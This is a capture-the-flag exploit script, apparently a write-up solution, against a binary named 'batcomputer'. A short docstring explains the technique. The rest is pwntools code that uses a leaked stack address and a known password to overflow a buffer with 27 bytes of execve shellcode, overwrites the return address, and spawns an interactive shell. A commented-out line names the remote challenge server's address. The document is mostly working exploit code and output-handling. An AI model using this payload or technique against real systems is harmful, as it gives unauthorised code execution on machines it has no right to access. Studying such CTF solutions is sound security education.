# Type: NX disabled, buffer overflow
"""
Explanation:
First we enumerate and see that NX is disabled, which means we can execute code on the stack if we find any buffer overflow. But PIE is enabled so the address of the stack will change everytime we run the program. But we have an address leak which leaks the address of a buffer. This same buffer is also used as our input for navigation commands, after we pass the b4tp@$$w0rd! ... So now we can calculate the offset of the return address from our buffer using cyclic, which turns out to be 84(line 33). So now we put our shellcode that needs to be executed and we put the address of our buffer as the return address. So the return address is supposed to be POPped from the stack and placed at RIP, RIP will point to our buffer to execute it, thus executing our shellcode. 
The shellcode we used is a 27 bytes shellcode from this website "http://shell-storm.org/shellcode/files/shellcode-806.php" 

"""
from pwn import *

# connect to remote process via netcat
target = process("./batcomputer")
#target.sendline("178.62.44.230 31939")

print target.recvuntil("> ")
target.sendline("1")

# grab the infoleak after choosing option 1
leak = target.recvline()
leak = leak.strip("It was very hard, but Alfred managed to locate him: ")

# convert infoleak to int
shellcode_addr = int(leak, 16)

# proceed with option 2 and provide password
print target.recvuntil("> ")
target.sendline("2")
print target.recvuntil("password: ")
target.sendline("b4tp@$$w0rd!")
print target.recvuntil("commands: ")

# construct our payload
# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = ""
shellcode += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode += "0"*(84-len(shellcode))
shellcode += p64(shellcode_addr)

# send our shellcode and overflow that buffer
target.sendline(shellcode)

# send invalid option to reach the return
target.recvuntil("> ")
target.sendline("3")

# spawn shell
target.interactive()

